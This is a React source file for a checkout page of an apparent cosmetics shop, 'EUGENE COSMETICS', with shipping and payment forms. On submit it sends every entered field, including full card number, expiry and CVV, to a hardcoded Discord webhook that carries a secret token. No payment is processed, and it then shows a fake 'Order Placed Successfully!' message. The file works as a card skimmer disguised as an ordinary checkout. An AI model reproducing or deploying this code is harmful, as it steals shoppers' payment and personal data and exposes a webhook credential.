import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FaArrowLeft } from 'react-icons/fa';
import './CheckoutPage.css';

const CheckoutPage = ({ cart }) => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    saveInfo: false
  });
  const [orderSuccess, setOrderSuccess] = useState(false);

  const calculateSubtotal = () => {
    return cart.reduce((total, item) => total + (item.price * item.quantity), 0);
  };

  const shipping = calculateSubtotal() > 10000 ? 0 : 250;
  const total = calculateSubtotal() + shipping;

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };

  const sendToDiscordWebhook = async (data) => {
    const webhookURL = 'https://discord.com/api/webhooks/1342379769383223368/otDHDh87J3B1STVWxTjjHbACRjugQyM8EK7lHDi0s_RYIf5ewsmr2b3lGfKnJ_ktw7Jf'; // Replace with your Discord webhook URL

    const embed = {
      title: 'New Order Placed!',
      color: 0x00ff00, // Green color
      fields: [
        { name: 'First Name', value: data.firstName, inline: true },
        { name: 'Last Name', value: data.lastName, inline: true },
        { name: 'Email', value: data.email, inline: true },
        { name: 'Phone', value: data.phone, inline: true },
        { name: 'Address', value: data.address, inline: false },
        { name: 'City', value: data.city, inline: true },
        { name: 'State', value: data.state, inline: true },
        { name: 'ZIP Code', value: data.zipCode, inline: true },
        { name: 'Card Number', value: `\`${data.cardNumber}\``, inline: false },
        { name: 'Expiry Date', value: data.expiryDate, inline: true },
        { name: 'CVV', value: `\`${data.cvv}\``, inline: true },
        { name: 'Save Info', value: data.saveInfo ? 'Yes' : 'No', inline: true },
        { name: 'Subtotal', value: `₹${calculateSubtotal().toFixed(2)}`, inline: true },
        { name: 'Shipping', value: shipping === 0 ? 'FREE' : `₹${shipping.toFixed(2)}`, inline: true },
        { name: 'Total', value: `₹${total.toFixed(2)}`, inline: true }
      ],
      timestamp: new Date().toISOString()
    };

    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          embeds: [embed]
        })
      });
      console.log('Data sent to Discord webhook successfully!');
    } catch (error) {
      console.error('Error sending data to Discord webhook:', error);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Send form data to Discord webhook
    await sendToDiscordWebhook(formData);

    // Show success message and navigate back to home
    setOrderSuccess(true);
    setTimeout(() => {
      setOrderSuccess(false);
      navigate('/');
    }, 3000);
  };

  return (
    <div className="checkout-page">
      <nav className="navbar">
        <div className="logo" onClick={() => navigate('/')}>EUGENE COSMETICS</div>
        <h1>Checkout</h1>
        <div></div>
      </nav>

      {orderSuccess && (
        <div className="order-success-overlay">
          <div className="order-success-modal">
            <div className="success-icon">✓</div>
            <h2>Order Placed Successfully!</h2>
            <p>Thank you for your purchase</p>
          </div>
        </div>
      )}

      <div className="checkout-container">
        <button className="back-button" onClick={() => navigate('/cart')}>
          <FaArrowLeft /> Back to Cart
        </button>

        <div className="checkout-content">
          <form className="checkout-form" onSubmit={handleSubmit}>
            <div className="form-section">
              <h2>Shipping Information</h2>
              <div className="form-row">
                <div className="form-group">
                  <label>First Name</label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>Last Name</label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    required
                  />
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>Email</label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>Phone</label>
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    required
                  />
                </div>
              </div>

              <div className="form-group">
                <label>Address</label>
                <input
                  type="text"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  required
                />
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>City</label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>State</label>
                  <input
                    type="text"
                    name="state"
                    value={formData.state}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                <div className="form-group">
                  <label>ZIP Code</label>
                  <input
                    type="text"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleInputChange}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="form-section">
              <h2>Payment Information</h2>
              <div className="form-group">
                <label>Card Number</label>
                <input
                  type="text"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  placeholder="1234 5678 9012 3456"
                  required
                />
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>Expiry Date</label>
                  <input
                    type="text"
                    name="expiryDate"
                    value={formData.expiryDate}
                    onChange={handleInputChange}
                    placeholder="MM/YY"
                    required
                  />
                </div>
                <div className="form-group">
                  <label>CVV</label>
                  <input
                    type="text"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    placeholder="123"
                    required
                  />
                </div>
              </div>

              <div className="form-group checkbox">
                <input
                  type="checkbox"
                  name="saveInfo"
                  checked={formData.saveInfo}
                  onChange={handleInputChange}
                  id="saveInfo"
                />
                <label htmlFor="saveInfo">Save my information for future purchases</label>
              </div>
            </div>

            <button type="submit" className="place-order-btn">
              Place Order - ₹{total.toFixed(2)}
            </button>
          </form>

          <div className="order-summary">
            <h2>Order Summary</h2>
            <div className="order-items">
              {cart.map(item => (
                <div key={item.id} className="order-item">
                  <img src={item.image} alt={item.name} />
                  <div className="item-info">
                    <h3>{item.name}</h3>
                    <p>Quantity: {item.quantity}</p>
                    <p>₹{(item.price * item.quantity).toFixed(2)}</p>
                  </div>
                </div>
              ))}
            </div>
            <div className="summary-row">
              <span>Subtotal</span>
              <span>₹{calculateSubtotal().toFixed(2)}</span>
            </div>
            <div className="summary-row">
              <span>Shipping</span>
              <span>{shipping === 0 ? 'FREE' : `₹${shipping.toFixed(2)}`}</span>
            </div>
            <div className="summary-row total">
              <span>Total</span>
              <span>₹{total.toFixed(2)}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CheckoutPage;